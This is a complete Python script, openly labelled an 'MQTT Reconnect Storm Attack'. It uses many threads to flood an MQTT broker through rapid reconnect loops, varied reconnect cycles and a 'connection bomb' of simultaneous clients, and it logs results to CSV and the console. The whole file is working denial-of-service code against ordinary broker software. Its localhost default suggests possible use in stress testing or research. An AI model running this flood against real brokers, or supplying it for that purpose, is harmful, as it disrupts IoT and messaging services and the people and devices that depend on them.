import argparse
import csv
import json
import os
import random
import threading
import time
from datetime import datetime, timezone

import paho.mqtt.client as mqtt

class ReconnectStormAttack:
    def __init__(self, args):
        self.args = args
        self.stop_event = threading.Event()
        self.log_writer, self.log_handle = self._prep_log(args.log_csv)
        self.log_lock = threading.Lock()
        
        self.total_connections = 0
        self.total_disconnections = 0
        self.connection_failures = 0
        self.active_connections = 0
        
        self.connection_lock = threading.Lock()

    @staticmethod
    def _prep_log(path):
        if not path:
            return None, None
        exists = os.path.exists(path)
        handle = open(path, "a", newline="", encoding="utf-8")
        writer = csv.writer(handle)
        if not exists:
            writer.writerow([
                "timestamp_utc", "client_id", "worker_id", "action", "status", 
                "return_code", "connection_time", "session_duration", "details"
            ])
        return writer, handle

    def close(self):
        if self.log_handle:
            self.log_handle.flush()
            self.log_handle.close()

    def log_connection_event(self, client_id, worker_id, action, status, return_code=0, 
                           connection_time=0, session_duration=0, details=""):
        if not self.log_writer:
            return
        with self.log_lock:
            self.log_writer.writerow([
                datetime.now(timezone.utc).isoformat(),
                client_id, worker_id, action, status, return_code, 
                f"{connection_time:.3f}", f"{session_duration:.3f}", details
            ])

    def update_connection_count(self, delta):
        with self.connection_lock:
            self.active_connections += delta

    def rapid_reconnect_worker(self, worker_id):
        base_client_id = f"{self.args.client_prefix}_rapid_{worker_id:03d}"
        
        reconnect_count = 0
        
        while not self.stop_event.is_set() and reconnect_count < self.args.max_reconnects_per_worker:
            client_id = f"{base_client_id}_{reconnect_count:04d}"
            client = mqtt.Client(client_id=client_id, clean_session=True)
            
            if self.args.username:
                client.username_pw_set(self.args.username, self.args.password)
            
            connection_start = time.time()
            session_start = None
            connected = False
            
            def on_connect(client, userdata, flags, rc):
                nonlocal connected, session_start
                connection_time = time.time() - connection_start
                
                with self.connection_lock:
                    self.total_connections += 1
                    if rc == 0:
                        self.update_connection_count(1)
                        connected = True
                        session_start = time.time()
                        status = "success"
                    else:
                        self.connection_failures += 1
                        status = "failed"
                
                self.log_connection_event(client_id, worker_id, "connect", status, rc, 
                                        connection_time, 0, f"flags={flags}")
                
                if reconnect_count % 50 == 0:
                    print(f"[Worker {worker_id}] Reconnect #{reconnect_count}, rc={rc}, time={connection_time:.3f}s")
            
            def on_disconnect(client, userdata, rc):
                nonlocal session_start
                session_duration = time.time() - session_start if session_start else 0
                
                with self.connection_lock:
                    self.total_disconnections += 1
                    self.update_connection_count(-1)
                
                disconnect_type = "voluntary" if rc == 0 else "involuntary"
                self.log_connection_event(client_id, worker_id, "disconnect", disconnect_type, 
                                        rc, 0, session_duration)
            
            client.on_connect = on_connect
            client.on_disconnect = on_disconnect
            
            try:
                client.connect(self.args.broker, self.args.port, self.args.keepalive)
                client.loop_start()
                
                timeout = 5
                start_wait = time.time()
                while not connected and time.time() - start_wait < timeout and not self.stop_event.is_set():
                    time.sleep(0.01)
                
                if connected:
                    session_duration = random.uniform(self.args.min_session_duration, 
                                                    self.args.max_session_duration)
                    time.sleep(session_duration)
                
                client.loop_stop()
                client.disconnect()
                
                reconnect_count += 1
                
                if self.args.reconnect_delay > 0:
                    time.sleep(random.uniform(0, self.args.reconnect_delay))
                
            except Exception as e:
                with self.connection_lock:
                    self.connection_failures += 1
                    
                self.log_connection_event(client_id, worker_id, "connect", "exception", 
                                        -1, 0, 0, f"error={str(e)}")
                time.sleep(1)
        
        print(f"[Worker {worker_id}] Completed {reconnect_count} reconnections")

    def persistent_reconnect_worker(self, worker_id):
        base_client_id = f"{self.args.client_prefix}_persist_{worker_id:03d}"
        
        cycle_count = 0
        
        while not self.stop_event.is_set():
            if cycle_count % 3 == 0:
                self.fast_reconnect_cycle(base_client_id, worker_id, cycle_count)
            elif cycle_count % 3 == 1:
                self.slow_reconnect_cycle(base_client_id, worker_id, cycle_count)
            else:
                self.random_reconnect_cycle(base_client_id, worker_id, cycle_count)
            
            cycle_count += 1

    def fast_reconnect_cycle(self, base_client_id, worker_id, cycle):
        for i in range(20):
            if self.stop_event.is_set():
                break
                
            client_id = f"{base_client_id}_fast_{cycle}_{i}"
            self.single_connection_cycle(client_id, worker_id, 
                                       session_duration=random.uniform(0.1, 0.5),
                                       reconnect_delay=random.uniform(0.05, 0.2))

    def slow_reconnect_cycle(self, base_client_id, worker_id, cycle):
        for i in range(5):
            if self.stop_event.is_set():
                break
                
            client_id = f"{base_client_id}_slow_{cycle}_{i}"
            self.single_connection_cycle(client_id, worker_id,
                                       session_duration=random.uniform(2, 5),
                                       reconnect_delay=random.uniform(1, 3))

    def random_reconnect_cycle(self, base_client_id, worker_id, cycle):
        reconnects = random.randint(5, 15)
        for i in range(reconnects):
            if self.stop_event.is_set():
                break
                
            client_id = f"{base_client_id}_random_{cycle}_{i}"
            self.single_connection_cycle(client_id, worker_id,
                                       session_duration=random.uniform(0.1, 10),
                                       reconnect_delay=random.uniform(0.01, 2))

    def single_connection_cycle(self, client_id, worker_id, session_duration, reconnect_delay):
        client = mqtt.Client(client_id=client_id, clean_session=True)
        
        if self.args.username:
            client.username_pw_set(self.args.username, self.args.password)
        
        connection_start = time.time()
        connected = False
        
        def on_connect(client, userdata, flags, rc):
            nonlocal connected
            connection_time = time.time() - connection_start
            
            with self.connection_lock:
                self.total_connections += 1
                if rc == 0:
                    connected = True
                    self.update_connection_count(1)
                else:
                    self.connection_failures += 1
            
            status = "success" if rc == 0 else "failed"
            self.log_connection_event(client_id, worker_id, "connect", status, rc, connection_time)
        
        def on_disconnect(client, userdata, rc):
            with self.connection_lock:
                self.total_disconnections += 1
                self.update_connection_count(-1)
            
            disconnect_type = "voluntary" if rc == 0 else "involuntary"
            self.log_connection_event(client_id, worker_id, "disconnect", disconnect_type, rc, 
                                    0, session_duration)
        
        client.on_connect = on_connect
        client.on_disconnect = on_disconnect
        
        try:
            client.connect(self.args.broker, self.args.port, self.args.keepalive)
            client.loop_start()
            
            timeout = 3
            start_wait = time.time()
            while not connected and time.time() - start_wait < timeout and not self.stop_event.is_set():
                time.sleep(0.01)
            
            if connected:
                if random.random() < 0.3:
                    topic = f"reconnect/storm/{worker_id}/status"
                    payload = json.dumps({
                        "timestamp": datetime.now().isoformat(),
                        "client_id": client_id,
                        "worker_id": worker_id,
                        "session_duration": session_duration
                    })
                    client.publish(topic, payload, qos=0)
                
                time.sleep(session_duration)
            
            client.loop_stop() 
            client.disconnect()
            
            time.sleep(reconnect_delay)
            
        except Exception as e:
            with self.connection_lock:
                self.connection_failures += 1
            self.log_connection_event(client_id, worker_id, "connect", "exception", -1, 
                                    0, 0, f"error={str(e)}")

    def connection_bomb_worker(self, worker_id):
        print(f"[Worker {worker_id}] Starting connection bomb attack")
        
        bomb_size = self.args.bomb_size
        clients = []
        
        for i in range(bomb_size):
            if self.stop_event.is_set():
                break
                
            client_id = f"{self.args.client_prefix}_bomb_{worker_id}_{i:03d}"
            client = mqtt.Client(client_id=client_id, clean_session=True)
            
            if self.args.username:
                client.username_pw_set(self.args.username, self.args.password)
            
            def make_on_connect(client_id, worker_id):
                def on_connect(client, userdata, flags, rc):
                    with self.connection_lock:
                        self.total_connections += 1
                        if rc == 0:
                            self.update_connection_count(1)
                        else:
                            self.connection_failures += 1
                    
                    status = "success" if rc == 0 else "failed"
                    self.log_connection_event(client_id, worker_id, "bomb_connect", status, rc)
                return on_connect
            
            client.on_connect = make_on_connect(client_id, worker_id)
            clients.append((client, client_id))
        
        for client, client_id in clients:
            if self.stop_event.is_set():
                break
            try:
                client.connect(self.args.broker, self.args.port, self.args.keepalive)
                client.loop_start()
                time.sleep(0.01)
            except Exception as e:
                self.log_connection_event(client_id, worker_id, "bomb_connect", "exception", 
                                        -1, 0, 0, f"error={str(e)}")
        
        print(f"[Worker {worker_id}] Connection bomb launched: {len(clients)} clients")
        
        time.sleep(self.args.bomb_duration)
        
        for client, client_id in clients:
            try:
                client.loop_stop()
                client.disconnect()
                with self.connection_lock:
                    self.total_disconnections += 1
                    self.update_connection_count(-1)
                self.log_connection_event(client_id, worker_id, "bomb_disconnect", "voluntary")
            except:
                pass

    def attack_worker(self, worker_id):
        attack_type = worker_id % 3
        
        try:
            if attack_type == 0:
                self.rapid_reconnect_worker(worker_id)
            elif attack_type == 1:
                self.persistent_reconnect_worker(worker_id)
            else:
                self.connection_bomb_worker(worker_id)
                
        except Exception as e:
            print(f"[Worker {worker_id}] Worker exception: {e}")

    def run(self):
        print(f"Starting Reconnect Storm attack with {self.args.workers} workers")
        print(f"Target: {self.args.broker}:{self.args.port}")
        print(f"Max reconnects per worker: {self.args.max_reconnects_per_worker}")
        print(f"Session duration: {self.args.min_session_duration}-{self.args.max_session_duration}s")
        
        threads = []
        for i in range(self.args.workers):
            thread = threading.Thread(target=self.attack_worker, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
            time.sleep(0.1)
        
        try:
            while True:
                time.sleep(5)
                with self.connection_lock:
                    print(f"\n=== Reconnect Storm Statistics ===")
                    print(f"Total connections: {self.total_connections}")
                    print(f"Total disconnections: {self.total_disconnections}")
                    print(f"Connection failures: {self.connection_failures}")
                    print(f"Active connections: {self.active_connections}")
                    
                    if self.total_connections > 0:
                        success_rate = ((self.total_connections - self.connection_failures) / 
                                      self.total_connections) * 100
                        print(f"Connection success rate: {success_rate:.1f}%")
                    print("=================================\n")
                
        except KeyboardInterrupt:
            print("\nStopping reconnect storm...")
            self.stop_event.set()
            
            for thread in threads:
                thread.join(timeout=15)
            
            print(f"\nReconnect storm completed!")
            print(f"Final statistics:")
            print(f"  Total connections: {self.total_connections}")
            print(f"  Total disconnections: {self.total_disconnections}")
            print(f"  Connection failures: {self.connection_failures}")

def main():
    parser = argparse.ArgumentParser(description="MQTT Reconnect Storm Attack")
    parser.add_argument("--broker", default="localhost", help="MQTT broker address")
    parser.add_argument("--port", type=int, default=1883, help="MQTT broker port")
    parser.add_argument("--username", help="MQTT username")
    parser.add_argument("--password", help="MQTT password")
    parser.add_argument("--keepalive", type=int, default=10, help="Keepalive interval (short for storm)")
    
    parser.add_argument("--workers", type=int, default=10, help="Number of attack workers")
    
    parser.add_argument("--max-reconnects-per-worker", type=int, default=1000,
                       help="Maximum reconnects per rapid worker")
    
    parser.add_argument("--min-session-duration", type=float, default=0.1,
                       help="Minimum session duration (seconds)")
    parser.add_argument("--max-session-duration", type=float, default=5.0,
                       help="Maximum session duration (seconds)")
    
    parser.add_argument("--reconnect-delay", type=float, default=0.1,
                       help="Maximum delay between reconnects (seconds)")
    
    parser.add_argument("--bomb-size", type=int, default=50,
                       help="Number of simultaneous connections for bomb attack")
    parser.add_argument("--bomb-duration", type=float, default=30,
                       help="Duration to hold bomb connections (seconds)")
    
    parser.add_argument("--client-prefix", default="storm", help="Client ID prefix")
    
    parser.add_argument("--log-csv", help="CSV file to log attack details")
    
    args = parser.parse_args()
    
    attack = ReconnectStormAttack(args)
    try:
        attack.run()
    finally:
        attack.close()

if __name__ == "__main__":
    main()
